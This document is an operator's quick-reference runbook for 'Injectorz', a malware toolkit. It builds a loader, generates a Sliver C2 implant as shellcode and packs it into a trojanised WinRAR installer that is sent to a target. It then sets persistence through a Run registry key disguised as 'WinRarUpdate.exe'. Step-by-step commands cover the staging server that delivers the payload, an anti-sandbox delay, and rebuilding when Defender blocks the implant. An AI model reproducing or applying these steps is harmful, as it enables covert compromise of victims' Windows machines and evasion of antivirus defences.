# Injectorz Quick Workflow

Quick reference for deployment. For full documentation, see [README.md](README.md).

---

## Quick Start

```bash
# 1. Build loader
python3 build_loader.py --stager-ip <STAGING_IP> --stager-port <STAGING_PORT>

# 2. In Sliver: generate implant
generate --http <STAGING_IP>:<C2_PORT> --os windows --arch amd64 \
  --skip-symbols --format shellcode --save shellc.bin
# encoder: none

# 3. Build installer
python3 build_installer.py --installer winrar_x64.exe --output winrar_installer.exe

# 4. Start staging server (detached)
nohup python3 -m http.server <STAGING_PORT> >/tmp/stager.log 2>&1 &

# 5. In Sliver: start listener
http -L <STAGING_IP> -l 8080

# 6. Transfer winrar_installer.exe to target
```

---

## Persistence Setup (from Session)

```bash
sessions -i <ID>

mkdir "C:\Users\<user>\AppData\Local\WinRar"

upload /home/heyrm/tools/injectorz/loader.exe "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe"

registry write --hive HKCU --type string \
  "software\microsoft\windows\currentversion\run\WinRarUpdate" \
  "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe"

registry read --hive HKCU "software\microsoft\windows\currentversion\run\WinRarUpdate"
```

---

## Verification

```bash
# Test persistence
execute shutdown /r /t 0

# Wait 2-3 minutes (reboot + logon + loader delay 15s)
sessions
```

Expected: new session from `WinRarUpdate.exe`

---

## File Sizes Reference

| File | Size | Purpose |
|------|------|---------|
| loader.exe | ~523KB | Standalone test |
| loader_embed.exe | ~528KB | For installer |
| winrar_installer.exe | ~4.4MB | Final payload |
| shellc.bin | 200-800KB | Implant shellcode |

---

## Timing

- Loader delay: 9 seconds (anti-sandbox)
- Fetch retry: 4x, 3 second interval
- Session callback: after successful fetch
- Persistence trigger: on user logon
- Expected delay after logon: 15-20 seconds

---

## Quick Checklist

### Before Deploy
- [ ] Staging IP correct in build_loader
- [ ] NEW implant generated (do not reuse)
- [ ] shellc.bin exists in folder
- [ ] Staging server running
- [ ] Sliver listener running

### After Session Appears
- [ ] Setup persistence IMMEDIATELY
- [ ] Verify registry Run key
- [ ] Test reboot

---

## Emergency Commands

### Check staging log
```bash
tail -f /tmp/stager.log
grep GET /tmp/stager.log
```

### Check staging server is running
```bash
pgrep -af 'http.server <STAGING_PORT>'
```

### Kill staging server
```bash
pkill -f 'http.server <STAGING_PORT>'
```

### Restart staging server
```bash
pkill -f 'http.server <STAGING_PORT>'
cd ~/tools/injectorz
nohup python3 -m http.server <STAGING_PORT> >/tmp/stager.log 2>&1 &
```

---

## Common Issues

| Issue | Check | Fix |
|-------|-------|-----|
| No session | `tail -f /tmp/stager.log` | Ensure staging running + IP correct |
| Session dies after installer closes | Process name in sessions | Ensure early bird (Notepad.exe) |
| Persistence doesn't fire | Registry key missing | Re-setup from session |
| Defender blocks | `Get-MpThreatDetection` | Rebuild loader + new implant |

---

For complete troubleshooting and detailed architecture, see [README.md](README.md).
